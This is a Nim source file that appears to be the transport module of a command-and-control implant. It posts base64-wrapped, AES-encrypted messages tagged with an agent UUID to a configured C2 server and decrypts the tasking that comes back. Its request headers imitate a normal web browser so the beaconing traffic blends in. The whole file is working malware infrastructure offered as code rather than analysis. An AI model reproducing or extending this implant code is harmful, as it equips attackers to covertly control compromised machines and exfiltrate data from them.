import std/[httpclient, base64, strutils]
import config, crypto/aes, core/utils

type
  Transport* = ref object
    client: HttpClient
    baseUrl: string
    endpoint: string

proc newTransport*(): Transport =
  var headers = newHttpHeaders({
    "User-Agent":      UserAgent,
    "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type":    "text/plain",
    "Connection":      "keep-alive",
    "Cache-Control":   "no-cache",
  })
  result = Transport(
    client: newHttpClient(headers = headers),
    baseUrl: C2BaseUrl,
    endpoint: C2Endpoint,
  )

proc buildMessage*(currentUUID: string, aesKey: seq[byte], jsonBody: string): string =
  ## Format encrypted: base64( uuid(36 bytes) + IV(16) + ciphertext + HMAC(32) )
  ## Format plaintext: base64( uuid(36 bytes) + json_bytes )
  var uuidPadded = currentUUID
  while uuidPadded.len < 36:
    uuidPadded.add('\x00')
  let uuidBytes = toBytes(uuidPadded[0..35])

  if aesKey.len == 32:
    let encrypted = aesEncrypt(aesKey, jsonBody)
    let payload = uuidBytes & encrypted
    result = base64.encode(payload)
  else:
    let payload = uuidBytes & toBytes(jsonBody)
    result = base64.encode(payload)

proc parseResponse*(raw: seq[byte], aesKey: seq[byte]): string =
  if raw.len < 36:
    return ""
  let bodyPart = raw[36 .. ^1]
  if aesKey.len == 32:
    result = aesDecrypt(aesKey, bodyPart)
  else:
    result = fromBytes(bodyPart)

proc post*(t: Transport, currentUUID: string, aesKey: seq[byte], jsonBody: string): string =
  let url = t.baseUrl.strip(chars = {'/'}) & "/" & t.endpoint.strip(chars = {'/'})
  let message = buildMessage(currentUUID, aesKey, jsonBody)

  when defined(debug):
    stderr.writeLine("[*] POST " & url)

  try:
    let response = t.client.post(url, body = message)
    when defined(debug):
      stderr.writeLine("[*] HTTP " & $response.status)
    let body = response.body.strip()
    if body.len == 0:
      when defined(debug):
        stderr.writeLine("[!] Empty response body")
      return ""
    let rawBytes = toBytes(base64.decode(body))
    result = parseResponse(rawBytes, aesKey)
    when defined(debug):
      if result.len == 0:
        stderr.writeLine("[!] Decrypt failed or empty response")
      else:
        stderr.writeLine("[+] Response OK (" & $result.len & " bytes)")
  except Exception as e:
    when defined(debug):
      stderr.writeLine("[!] HTTP error: " & e.msg)
    result = ""
